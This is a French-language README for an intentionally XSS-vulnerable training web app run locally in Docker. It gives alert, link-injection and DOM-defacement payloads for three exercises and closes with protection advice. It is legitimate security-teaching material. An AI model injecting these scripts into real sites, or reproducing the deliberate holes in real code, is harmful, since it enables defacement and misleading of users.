# XSS Vulnerable App: Guide d'Exploitation

Ce projet est une application web volontairement vulnérable aux attaques XSS (Cross-Site Scripting) permettant d’expérimenter et de comprendre ses vulnérabilités.

---

## Prérequis

### 🔹 **Outils nécessaires**
- **Docker** (Vérifiez l’installation avec `docker --version`).
- **Navigateur Web** (Chrome, Firefox, etc.).
- **Git** afin de cloner le dépôt.
---

## Installation et Lancement

**Cloner le projetn et accéder au dossier du projet**  
```sh
git clone https://github.com/zakisfa/xss-vulnerable-app.git
cd xss-vulnerable-app
```

**Construire l’image Docker avec la commande suivante**  
```sh
docker build -t xss-vulnerable-app .
```

**Exécuter le conteneur**  
```sh
docker run -d -p 8080:80 xss-vulnerable-app
```

**Accéder à l'application**  
```sh
http://localhost:8080
```

---

## Scénarios d’attaque XSS
Une fois connecté a l'application vous serez sur l'index de l'application, il y a 3 scénarios possibles d'injections.
Faites les dans l'ordre.
### **Injection XSS via Pop-up**
#### Description :
Ce scénario illustre comment injecter un script malveillant qui déclenche une **alerte** sur le navigateur.

#### Objectif :
- Injecter un script dans le champ pour **afficher un pop-up**.

#### Solution :
Saisissez cette **payload XSS** et validez le formulaire :
```html
<script>alert('XSS réussie!');</script>
```
**Impact** : Un attaquant peut injecter du JavaScript et exécuter du code arbitraire.

---

### **XSS via Insertion de Lien Malveillant**
#### Description :
L’objectif est de **piéger** un utilisateur en lui faisant cliquer sur un **lien injecté** dans un commentaire.

#### Objectif :
- Insérer un lien malveillant dans un champ commentaire.

#### Solution :
Saisissez cette **payload XSS** et validez le formulaire :
```html
<a href="https://google.com" target="_blank">Cliquez ici</a>
```
 **Impact** : Un attaquant peut rediriger un utilisateur vers un **site malveillant**.

---

### **XSS via DOM Manipulation**
#### Description :
Ce scénario montre comment le JavaScript d’une page peut être manipulé dynamiquement sans interaction serveur.

#### Objectif :
- Exploiter une injection pour **modifier le DOM**.

#### Solution :
1. Dans le champ, injecter l'un des scripts suivants :
   
   **Modifier le titre de la page** :
   ```html
   <script>document.title = "Site piraté !";</script>
   ```

   **Changer le texte principal** :
   ```html
   <script>document.querySelector('h1').innerText = "Ce site est compromis";</script>
   ```

   **Modifier l'apparence du site** :
   ```html
   <script>
   document.body.style.backgroundColor = "black";
   document.body.style.color = "red";
   </script>
   ```

   **Afficher un message d'alerte en haut de la page** :
   ```html
   <script>
   let warning = document.createElement("div");
   warning.style = "position: fixed; top: 0; left: 0; width: 100%; background: red; color: white; padding: 10px; font-size: 20px; text-align: center;";
   warning.innerText = "⚠️ Alerte : Site compromis !";
   document.body.prepend(warning);
   </script>
   ```

   **Faux message d'erreur** :
   ```html
   <script>
   document.body.innerHTML = "<h1 style='color:red;text-align:center;'>Erreur 500 - Site en maintenance</h1>";
   </script>
   ```

2. Valider le formulaire et observer le changement sur la page.

**Impact** : Un attaquant peut modifier le contenu affiché, afficher des messages trompeurs, et perturber la navigation.

---

## Comment Se Protéger ?
 **Éviter d’afficher directement les entrées utilisateur** (utiliser `htmlspecialchars()`).  
 **Implémenter un Content Security Policy (CSP)**.  
 **Échapper systématiquement** les entrées dans le DOM (`innerText` au lieu de `innerHTML`).  
 **Filtrer les entrées utilisateurs** côté serveur.

---

## Disclaimer

**Ce projet est destiné à l’éducation uniquement.** 

**Auteur : DANNENMULLER ZACHARIE**
